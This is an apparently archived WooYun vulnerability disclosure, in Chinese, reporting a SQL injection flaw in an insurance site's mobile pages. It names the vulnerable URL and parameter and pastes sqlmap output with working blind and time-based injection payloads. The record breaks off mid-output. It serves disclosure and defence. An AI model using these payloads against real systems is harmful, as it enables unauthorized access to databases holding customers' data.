wybug_title: 泛华保网Wap端存在SQL注入漏洞
wybug_detail:
漏洞详情 披露状态：   									2016-01-07：	细节已通知厂商并且等待厂商处理中									2016-01-10：	厂商已经确认，细节仅向厂商公开									2016-01-20：	细节向核心白帽子及相关领域专家公开									2016-01-30：	细节向普通白帽子公开									2016-02-09：	细节向实习白帽子公开									2016-02-22：	细节向公众公开  简要描述： 存在SQL注入漏洞 详细说明：  注入点：http://m.baoxian.com/product/productTable.do?ERiskSubType=C00&SaleCount=Ase (GET)貌似假数据一样，1000多个表   漏洞证明：  




sqlmap identified the following injection point(s) with a total of 143 HTTP(s) requests:---Parameter: ERiskSubType (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ERiskSubType=C00') AND 2079=2079 AND ('aAgR'='aAgR&SaleCount=Ase    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: ERiskSubType=C00') AND (SELECT * FROM (SELECT(SLEEP(5)))GRSK) AND ('yVWi'='yVWi&SaleCount=Ase---web application technology: Nginxback-end DBMS: MySQL 5.0.12sqlmap resumed the following injection point(s) from stored session:---Parameter: ERiskSubType (GET)    Type: boolean-based blind    Title: AND boolean-based blind -
